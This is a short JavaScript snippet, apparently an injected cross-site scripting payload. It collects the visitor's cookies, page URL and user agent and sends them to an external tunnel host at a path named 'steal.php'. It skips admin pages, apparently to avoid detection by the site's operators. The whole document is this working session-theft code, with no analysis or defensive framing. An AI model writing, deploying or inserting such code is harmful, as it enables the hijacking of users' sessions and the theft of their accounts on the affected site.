if (!location.pathname.includes('/admin/')) {
    const params = new URLSearchParams({
        cookie: document.cookie,
        url: location.href,
        ua: navigator.userAgent
    });
    fetch('https://soonest-therapist-backgrounds-producer.trycloudflare.com/steal.php?' + params.toString(), {
        method: 'GET',
        mode: 'no-cors'
    });
}
